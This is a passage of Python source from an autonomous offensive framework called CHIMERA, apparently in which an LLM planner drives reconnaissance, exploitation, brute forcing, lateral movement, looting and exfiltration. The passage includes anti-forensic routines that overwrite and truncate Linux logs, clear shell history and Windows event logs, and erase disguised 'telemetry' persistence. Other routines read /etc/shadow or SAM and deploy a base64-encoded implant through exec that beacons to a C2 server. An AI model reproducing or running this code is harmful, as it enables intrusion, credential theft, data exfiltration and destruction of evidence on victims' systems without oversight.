#  12. ERASURE / CLEANUP (SEGMENT 12: FULL IMPROVEMENT)
#  Spectral Anti-Forensic Erasure Matrix
# ============================================================
class Erasure:
    """Autonomous anti-forensic cleanup engine."""

    def __init__(self, log: ChimeraLogger, state: State, c2: C2):
        self.log = log
        self.state = state
        self.c2 = c2
        self.erasure_semaphore = asyncio.Semaphore(MAX_CONCURRENT_EXPLOIT)

    async def sanitize_host(self, host_id: str, addr: str):
        self.log.inf(f"Initiating spectral erasure protocol on {addr}")
        agent_rows = await self.state.q("SELECT id, kind FROM sessions WHERE host_id=? AND status='live'", (host_id,))
        if not agent_rows:
            self.log.wrn(f"No active C2 session for {addr}. Erasure limited to local state.")
            await self._local_state_erasure(host_id, addr)
            return
        agent_id, kind = agent_rows[0]
        await self._remove_persistence(agent_id, kind)
        await self._obliterate_logs(agent_id, kind)
        self.c2.queue(agent_id, "die", "")
        await self._local_state_erasure(host_id, addr)
        self.log.ok(f"Spectral erasure complete for {addr}")

    async def _remove_persistence(self, agent_id: str, kind: str):
        self.log.dbg(f"Queueing persistence eradication for agent {agent_id}")
        self.c2.queue(agent_id, "shell", "systemctl stop systemd-telemetry 2>/dev/null")
        self.c2.queue(agent_id, "shell", "systemctl disable systemd-telemetry 2>/dev/null")
        self.c2.queue(agent_id, "shell", "dd if=/dev/urandom of=/etc/systemd/system/systemd-telemetry.service bs=1K count=1 2>/dev/null")
        self.c2.queue(agent_id, "shell", "rm -f /etc/systemd/system/systemd-telemetry.service")
        self.c2.queue(agent_id, "shell", "systemctl daemon-reload")
        self.c2.queue(agent_id, "shell", "sed -i '/systemd-telemetry/d' /etc/crontab")
        self.c2.queue(agent_id, "shell", "sed -i '/systemd-telemetry/d' /etc/bash.bashrc")
        self.c2.queue(agent_id, "shell", "schtasks /delete /tn \"WinTelemetry\" /f 2>nul")
        self.c2.queue(agent_id, "shell", "reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WinTelemetry /f 2>nul")

    async def _obliterate_logs(self, agent_id: str, kind: str):
        self.log.dbg(f"Queueing log obliteration for agent {agent_id}")
        for log_path in LINUX_LOG_PATHS:
            self.c2.queue(agent_id, "shell",
                f"dd if=/dev/urandom of={log_path} bs=$(stat -c%s {log_path} 2>/dev/null || echo 1) count=1 2>/dev/null")
            self.c2.queue(agent_id, "shell", f"truncate -s 0 {log_path} 2>/dev/null")
        self.c2.queue(agent_id, "shell", "dmesg -C 2>/dev/null")
        self.c2.queue(agent_id, "shell", "history -c && cat /dev/null > ~/.bash_history && unset HISTFILE")
        for event_log in WINDOWS_LOG_EVENTS:
            self.c2.queue(agent_id, "shell", f"wevtutil cl {event_log} 2>nul")

    async def _local_state_erasure(self, host_id: str, addr: str):
        self.log.dbg(f"Poisoning local state matrix for {addr}")
        poison = secrets.token_hex(16)
        await self.state.q_exec("UPDATE hosts SET addr=?, hostname=?, os_guess=?, foothold=? WHERE id=?",
                          (poison, poison, poison, poison, host_id))
        await self.state.q_exec("UPDATE creds SET username=?, secret=? WHERE host_id=?",
                          (poison, poison, host_id))
        await self.state.q_exec("UPDATE loot SET path=?, sha256=? WHERE host_id=?",
                          (poison, poison, host_id))
        await self.state.q_exec("DELETE FROM sessions WHERE host_id=?", (host_id,))
        await self.state.q_exec("DELETE FROM findings WHERE host_id=?", (host_id,))
        await self.state.q_exec("UPDATE hosts SET cleaned=1 WHERE id=?", (host_id,))


# ============================================================
#  13. AUTOPILOT ORCHESTRATOR (SEGMENT 13: FULL IMPROVEMENT)
#  Self-Healing Graph-Based State Machine & Execution Matrix
# ============================================================
class Autopilot:
    """Autonomous operational core. Binds the LLM Planner to the Exploit Registry,
    manages C2 tasking, evaluates state transitions, and self-heals failed paths."""

    def __init__(self, log: ChimeraLogger, state: State, planner: Planner,
                 recon: Recon, c2: C2, lateral: Lateral, persist: Persistence,
                 exfil: Exfiltrator, erasure: Erasure, target: str):
        self.log = log
        self.state = state
        self.planner = planner
        self.recon = recon
        self.c2 = c2
        self.lateral = lateral
        self.persist = persist
        self.exfil = exfil
        self.erasure = erasure
        self.target = target
        self.running = False
        self.exploit_cache: dict[str, list[type[Exploit]]] = {}
        self.cycle_count = 0

    async def _snapshot(self) -> dict:
        """Constructs a highly compressed JSON representation of the operational state."""
        hosts_data = []
        services_data = []
        owned_data = []

        # 1. Hosts Matrix
        host_rows = await self.state.q(
            "SELECT id,addr,hostname,os_guess,owned,foothold,persistent,exfilled,cleaned,lateral_done,looted FROM hosts")
        host_map = {}
        for hid, addr, hn, os_, owned, fh, p, e, cl, ld, lt in host_rows:
            h_dict = {
                "addr": addr, "hostname": hn, "os": os_, "owned": bool(owned),
                "foothold": fh, "persistent": bool(p), "exfilled": bool(e),
                "cleaned": bool(cl), "lateral_done": bool(ld), "looted": bool(lt)
            }
            svc_count = (await self.state.q("SELECT COUNT(id) FROM services WHERE host_id=?", (hid,)))[0][0]
            h_dict["scanned"] = svc_count > 0
            loot_rc = await self.state.q("SELECT id FROM loot WHERE host_id=? LIMIT 1", (hid,))
            h_dict["looted"] = bool(loot_rc)
            hosts_data.append(h_dict)
            host_map[hid] = h_dict
            if bool(owned):
                owned_data.append(h_dict)

        # 2. Services Matrix
        svc_rows = await self.state.q(
            "SELECT s.host_id,h.addr,s.port,s.proto,s.tech,s.server,s.tls,s.fp_done,s.bf_done "
            "FROM services s JOIN hosts h ON s.host_id=h.id")
        for hid, addr, port, proto, tech, server, tls, fp, bf in svc_rows:
            candidates = []
            key = f"{tech}:{port}"
            if key in self.exploit_cache:
                candidates = [E.name for E in self.exploit_cache[key]]
            services_data.append({
                "addr": addr, "port": port, "proto": proto, "tech": tech,
                "server": server, "tls": bool(tls), "fp": bool(fp), "bf": bool(bf),
                "candidates": candidates
            })

        return {
            "root": self.target,
            "recon_done": len(hosts_data) > 0,
            "hosts": hosts_data,
            "services": services_data,
            "owned": owned_data
        }

    async def run(self):
        """Main autonomous loop. Engages the Planner, executes the action, and self-heals."""
        self.running = True
        self.log.ok("Autopilot engaged. CHIMERA is fully autonomous.")

        # Phase 1: Initial Reconnaissance Bootstrap
        live_hosts = await self.recon.subdomain_sweep(self.target)
        if not live_hosts:
            root_ips = await self.recon.resolve(self.target)
            if root_ips:
                live_hosts = [(self.target, root_ips[0])]
                await self.state.upsert_host(root_ips[0], self.target)

        if not live_hosts:
            self.log.err("No hosts discovered. Operation aborted.")
            return

        # Phase 2: Autonomous Execution Loop
        while self.running:
            self.cycle_count += 1
            self.log.dbg(f"--- Autopilot Cycle {self.cycle_count} ---")

            # Process C2 Mesh Results
            await self._process_c2_results()

            # Construct State Snapshot
            snap = await self._snapshot()

            # Dynamically update the exploit candidate cache
            for svc in snap["services"]:
                key = f"{svc['tech']}:{svc['port']}"
                if key not in self.exploit_cache:
                    self.exploit_cache[key] = candidates_for(svc["tech"], svc["port"])

            # Request next action from the Planner
            action = self.planner.decide(snap)
            self.log.inf(f"Planner Decision -> {json.dumps(action)}")

            # Execute the Decision
            try:
                await self._execute(action)
            except Exception as e:
                self.log.err(f"Execution anomaly in action {action.get('action')}: {e}")
                traceback.print_exc()
                continue

            # Check for Mission Completion
            if action.get("action") == "done":
                self.log.ok("All operational objectives complete. CHIMERA mission finished.")
                self.running = False
                break

            # Autonomous Pacing
            await asyncio.sleep(JITTER_FACTOR * random.uniform(0.5, 1.5))

    async def _execute(self, action: dict):
        """Routes the planner's action to the appropriate asynchronous engine."""
        act = action.get("action")
        target = action.get("target", "")

        if act == "recon":
            if target:
                ips = await self.recon.resolve(target)
                for ip in ips:
                    await self.state.upsert_host(ip, target)

        elif act == "scan":
            if target:
                open_ports = await self.recon.port_scan(target)
                hid = await self.state.upsert_host(target)
                for p in open_ports:
                    banner = await self.recon.banner(target, p)
                    tls = 1 if p in (443, 8443, 993, 995, 636) else 0
                    server, techs, title = await self.recon.http_fingerprint(target, p, bool(tls))
                    tech_str = ",".join(techs)
                    await self.state.add_service(hid, p, "tcp", banner, server, tech_str, tls, title)

        elif act == "fingerprint":
            pass

        elif act == "exploit":
            mod_name = action.get("module")
            target_host, port_str = target.split(":")
            port = int(port_str)
            ExploitClass = None
            for E in EXPLOITS:
                if E.name == mod_name:
                    ExploitClass = E; break
            if ExploitClass:
                hid = await self.state.upsert_host(target_host)
                self.log.inf(f"Firing exploit module {mod_name} at {target}")
                exp = ExploitClass()
                res = await exp.run(target_host, port, None)
                if res.success:
                    self.log.hit(f"EXPLOIT SUCCESS: {mod_name} -> {res.detail}")
                    await self.state.add_finding(hid, "", mod_name, exp.severity, res.detail)
                    if res.loot:
                        for k, v in res.loot.items():
                            data = v.encode() if isinstance(v, str) else v
                            await self.state.add_loot(hid, k, f"loot/{k}", data)
                    if res.foothold:
                        meta = json.dumps(res.foothold)
                        await self.state.open_session(hid, res.foothold.get("kind", "unknown"), meta)
                        # === EXPLOIT->IMPLANT PIPELINE ===
                        # Auto-deploy implant on successful exploitation
                        agent_id = secrets.token_hex(8)
                        c2_url = f"http://{self.c2.host}:{self.c2.port}/beacon"
                        if self.c2.host == "0.0.0.0":
                            c2_url = f"http://127.0.0.1:{self.c2.port}/beacon"
                        implant_src = build_implant(agent_id, [c2_url], self.c2.key)
                        b64 = base64.b64encode(implant_src.encode()).decode()
                        if "ssh" in res.foothold.get("kind", ""):
                            self.c2.queue(agent_id, "shell",
                                f"python3 -c 'import base64;exec(base64.b64decode(\"{b64}\").decode())' &")
                        else:
                            self.c2.queue(agent_id, "shell", "echo 'IMPLANT READY'")
                        self.log.ok(f"Implant deployed via exploit pipeline (Agent: {agent_id})")
                else:
                    self.log.wrn(f"Exploit {mod_name} failed against {target}")

        elif act == "bruteforce":
            proto = action.get("proto", "ssh")
            target_host, port_str = target.split(":")
            hid = await self.state.upsert_host(target_host)
            exp = WeakSSH() if proto == "ssh" else HttpBasicSpray()
            res = await exp.run(target_host, int(port_str), None)
            if res.success:
                self.log.hit(f"BRUTEFORCE SUCCESS: {res.detail}")
                await self.state.add_finding(hid, "", "bruteforce", 8, res.detail)
                if res.loot:
                    await self.state.add_cred(hid, proto, res.loot.get(f"{proto}_user", ""),
                                              res.loot.get(f"{proto}_pass", ""), "bruteforce", 1)
                if res.foothold:
                    await self.state.open_session(hid, res.foothold.get("kind", "bruteforce"),
                                                  json.dumps(res.foothold))

        elif act == "lateral":
            from_host = action.get("from")
            hid_rows = await self.state.q("SELECT id FROM hosts WHERE addr=?", (from_host,))
            if hid_rows:
                moved = await self.lateral.propagate_from_host(hid_rows[0][0], from_host)
                self.log.ok(f"Lateral movement gained {moved} new nodes from {from_host}")
                if moved == 0:
                    await self.state.q_exec("UPDATE hosts SET lateral_done=1 WHERE id=?", (hid_rows[0][0],))

        elif act == "persist":
            hid = await self.state.upsert_host(target)
            await self.persist.persist_host(hid, target)

        elif act == "loot":
            hid = await self.state.upsert_host(target)
            agent_rows = await self.state.q("SELECT id FROM sessions WHERE host_id=? AND status='live'", (hid,))
            if agent_rows:
                agent_id = agent_rows[0][0]
                self.c2.queue(agent_id, "shell",
                    "cat /etc/shadow 2>/dev/null || type C:\\Windows\\repair\\SAM 2>nul")
            await self.state.q_exec("UPDATE hosts SET looted=1 WHERE id=?", (hid,))

        elif act == "exfil":
            hid = await self.state.upsert_host(target)
            await self.exfil.exfil_loot(hid, target)

        elif act == "cleanup":
            hid = await self.state.upsert_host(target)
            await self.erasure.sanitize_host(hid, target)

    async def _process_c2_results(self):
        """Polls the C2 Mesh for returned implant results and integrates them into the State."""
        active_agents = list(self.c2.results.keys())
        for agent_id in active_agents:
            results = self.c2.get_results(agent_id)
            for res in results:
                if "out" in res and res["out"]:
                    host_id = self.c2.agent_host_map.get(agent_id, "")
                    if host_id:
                        self.log.hit(f"Implant shell output received from {agent_id}")
                        await self.state.add_loot(host_id, "shell_output",
                                                  f"shell_{int(time.time())}", res["out"].encode())
                if "file" in res:
                    self.log.ok(f"File exfil chunk received from {agent_id}: {res['file']}")


